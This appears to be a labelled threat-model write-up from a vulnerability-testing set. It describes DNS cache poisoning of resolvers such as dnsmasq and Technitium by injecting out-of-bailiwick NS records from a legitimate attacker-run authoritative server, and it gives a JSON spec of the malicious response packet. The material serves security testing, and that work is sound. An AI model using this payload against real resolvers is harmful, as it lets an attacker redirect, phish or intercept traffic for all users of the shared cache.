@@ -1,0 +1,217 @@
+**Threat Model**
+
+**Attack Assumption**
+
+- Target: A recursive/caching DNS resolver or forwarder (e.g., Technitium DNS Server, dnsmasq), reachable by clients over UDP port 53.
+- The attacker controls the authoritative DNS server for a zone they own (e.g., `attacker.lab`). This is a **legitimate** authoritative server — the attacker does not need to spoof any IP addresses or guess Transaction IDs.
+- Software behavior under test (potential non‑compliance with RFC 2181 §5.4.1 "Ranking data" / bailiwick rules):
+  - When receiving a response to a legitimate query for `*.attacker.lab`, the resolver processes the Authority section.
+  - If the Authority section contains NS RRsets for a domain **outside** the queried zone (e.g., `victim.lab` NS records in a response for `attacker.lab`), a compliant resolver must reject/ignore these out‑of‑bailiwick records.
+  - A vulnerable resolver caches these out‑of‑bailiwick NS RRsets, poisoning its shared cache.
+- The resolver serves multiple clients (e.g., LAN hosts) and all use this resolver for DNS; its cache is shared.
+- Caching is enabled and it honors NS RR TTLs from the Authority section.
+- No local pinning/override is configured for the victim zone (e.g., no hard‑coded forwarders or static NS for `victim.lab`).
+
+Under such a setup, a single legitimate DNS response with attacker‑chosen out‑of‑bailiwick Authority‑NS‑RDATA can inject a bogus delegation into the shared cache, redirecting subsequent lookups for the victim zone. All standard response validation checks (Transaction ID, source IP, Question section) pass because this is a genuine response to a real query — the only defense is the resolver's **bailiwick check**.
+
+This vulnerability class has been confirmed in other DNS implementations: CVE-2025-11411 (Unbound), CVE-2021-25220 (BIND9), CVE-2022-32983 (Knot Resolver).
+
+**Attacker Capability**
+
+- The attacker owns and operates the authoritative DNS server for `attacker.lab` (implemented by `malicious_auth_server.py` listening on UDP port 9953).
+- The attacker can configure this server to return **any** content in the Authority and Additional sections of responses to queries for `*.attacker.lab`.
+- The attacker does **not** need to spoof IP addresses, guess Transaction IDs, or race against legitimate responses. The response is a valid reply to a real query initiated by the resolver.
+- The attacker only needs to induce a single query for any name under `attacker.lab` (e.g., by having a victim visit a webpage that references `test.attacker.lab`).
+
+---
+
+**Attack Procedure**
+
+1. **Goal**
+
+   Poison the resolver's cache so that, for zone `victim.lab`, the NS RRset points to attacker‑controlled servers such as `ns1.evil.attacker.lab` and `ns2.evil.attacker.lab`. After poisoning, any client using this resolver that asks for names under `victim.lab` will be referred to the attacker's NS, enabling redirection, phishing, or interception.
+
+2. **Attacker runs a malicious authoritative server for `attacker.lab`**
+
+   The attacker operates `malicious_auth_server.py` on the host machine (UDP port 9953). When the server receives a query for `*.attacker.lab`, it returns a response with:
+
+   - **Header**
+     - `QR=1` (this is a response)
+     - `Opcode=0` (standard QUERY)
+     - `AA=1` (authoritative — the attacker IS the authority for `attacker.lab`)
+     - `TC=0`
+     - `RD=1` (recursion desired, copied from query)
+     - `RA=0`
+     - `RCODE=0` (No error)
+     - `ID`: **matches the query's Transaction ID** (copied from the incoming query).
+     - `QDCOUNT=1` — one Question section entry.
+     - `ANCOUNT=1` — one legitimate answer.
+     - `NSCOUNT=2` — two out‑of‑bailiwick NS RRs in the Authority section.
+     - `ARCOUNT=2` — two glue A records for the attacker NS names.
+
+   - **Question section (QD)**
+     - `QNAME = "test.attacker.lab."` (copied from query)
+     - `QTYPE = A`
+     - `QCLASS = IN`
+
+   - **Answer section (legitimate)**
+     - `NAME = "test.attacker.lab."`
+       - `TYPE = A`
+       - `CLASS = IN`
+       - `TTL = 86400`
+       - `RDATA = "6.6.6.7"`
+
+     This is a legitimate answer — `test.attacker.lab` does belong to the attacker's zone.
+
+   - **Authority section (NS RRset — the malicious out‑of‑bailiwick part)**
+     Two NS RRs forming the malicious delegation for a **different** zone:
+
+     1. `NAME = "victim.lab."`
+        - `TYPE = NS`
+        - `CLASS = IN`
+        - `TTL = 86400` (1 day; ensures persistence)
+        - `RDATA (NSDNAME) = "ns1.evil.attacker.lab."`
+
+     2. `NAME = "victim.lab."`
+        - `TYPE = NS`
+        - `CLASS = IN`
+        - `TTL = 86400`
+        - `RDATA (NSDNAME) = "ns2.evil.attacker.lab."`
+
+     These Authority‑NS‑RDATA values declare the attacker's nameservers as authoritative for `victim.lab` — a zone the attacker does **not** control. This is the out‑of‑bailiwick injection.
+
+   - **Additional section (glue)**
+     Glue A RRs so the resolver immediately knows where to send packets:
+
+     1. `NAME = "ns1.evil.attacker.lab."`
+        - `TYPE = A`
+        - `CLASS = IN`
+        - `TTL = 86400`
+        - `RDATA = "172.21.0.99"` (attacker IP)
+
+     2. `NAME = "ns2.evil.attacker.lab."`
+        - `TYPE = A`
+        - `CLASS = IN`
+        - `TTL = 86400`
+        - `RDATA = "172.21.0.99"` (attacker IP)
+
+3. **Trigger the query**
+
+   - The attacker induces a client (or the resolver itself) to query `test.attacker.lab A`.
+   - The resolver, having `attacker.lab` configured to forward to the attacker's authoritative server (192.168.65.254:9953), sends a legitimate query.
+   - The attacker's server replies with the response described above.
+   - All validation checks pass: Transaction ID matches ✓, source IP matches ✓, Question section matches ✓, Answer is in‑bailiwick ✓.
+
+4. **Resolver processing (vulnerable behavior)**
+
+   A vulnerable resolver does:
+
+   - Accepts the response (all standard checks pass).
+   - Caches the Answer: `test.attacker.lab. A 6.6.6.7` — this is legitimate.
+   - Processes the Authority section, sees an NS RRset for `victim.lab.`.
+   - **Fails to perform bailiwick check**: does not verify that `victim.lab.` is within the `attacker.lab` zone.
+   - Inserts this NS RRset into its cache:
+     - Cache key: (`NAME="victim.lab."`, `TYPE=NS`, `CLASS=IN`).
+     - Cached RDATA: `{ns1.evil.attacker.lab., ns2.evil.attacker.lab.}` with TTL 86400.
+   - Optionally caches the glue A RRs for `ns1.evil.attacker.lab.` and `ns2.evil.attacker.lab.`.
+
+   A correct resolver (performing bailiwick check) would:
+
+   - Accept the Answer (in‑bailiwick for `attacker.lab`).
+   - **Reject** the Authority NS RRset because `victim.lab.` is not a subdomain of `attacker.lab.` — it is out‑of‑bailiwick.
+   - Discard the associated glue records.
+
+5. **Resulting security impact**
+
+   - The resolver's *shared cache* is now poisoned for `victim.lab.`: its delegation NS RRset points to attacker NS names.
+   - For the TTL duration (~1 day), any client using this resolver that looks up `www.victim.lab`, `mail.victim.lab`, etc. will cause the resolver to:
+     - Treat the attacker's NS as the authority for `victim.lab`.
+     - Send subsequent DNS queries directly to `172.21.0.99`.
+   - The attacker's NS can now:
+     - Return arbitrary A/MX/TXT/etc. records (phishing, traffic hijack, mail interception).
+     - Selectively fail or alter responses (DoS or censorship).
+   - This effect is visible to *all* clients sharing the resolver and persists until the TTL expires or the cache entry is flushed.
+
+   No additional packets from the attacker are needed after this single response.
+
+---
+
+**Attack Message**
+
+A JSON representation of the malicious DNS response (UDP payload), as constructed by `malicious_auth_server.py`:
+
+```json
+{
+  "header": {
+    "id": "<copied from query>",
+    "qr": 1,
+    "opcode": 0,
+    "aa": 1,
+    "tc": 0,
+    "rd": 1,
+    "ra": 0,
+    "z": 0,
+    "rcode": 0,
+    "qdcount": 1,
+    "ancount": 1,
+    "nscount": 2,
+    "arcount": 2
+  },
+  "question": [
+    {
+      "qname": "test.attacker.lab.",
+      "qtype": "A",
+      "qclass": "IN"
+    }
+  ],
+  "answer": [
+    {
+      "name": "test.attacker.lab.",
+      "type": "A",
+      "class": "IN",
+      "ttl": 86400,
+      "rdata": "6.6.6.7"
+    }
+  ],
+  "authority": [
+    {
+      "name": "victim.lab.",
+      "type": "NS",
+      "class": "IN",
+      "ttl": 86400,
+      "rdata": "ns1.evil.attacker.lab."
+    },
+    {
+      "name": "victim.lab.",
+      "type": "NS",
+      "class": "IN",
+      "ttl": 86400,
+      "rdata": "ns2.evil.attacker.lab."
+    }
+  ],
+  "additional": [
+    {
+      "name": "ns1.evil.attacker.lab.",
+      "type": "A",
+      "class": "IN",
+      "ttl": 86400,
+      "rdata": "172.21.0.99"
+    },
+    {
+      "name": "ns2.evil.attacker.lab.",
+      "type": "A",
+      "class": "IN",
+      "ttl": 86400,
+      "rdata": "172.21.0.99"
+    }
+  ]
+}
+```
+
+This packet illustrates how the Authority‑NS‑RDATA field is populated to effect cache poisoning via out‑of‑bailiwick NS injection in a legitimate authoritative response.
+
+---
+
+**Classification**
+
+ATTACK
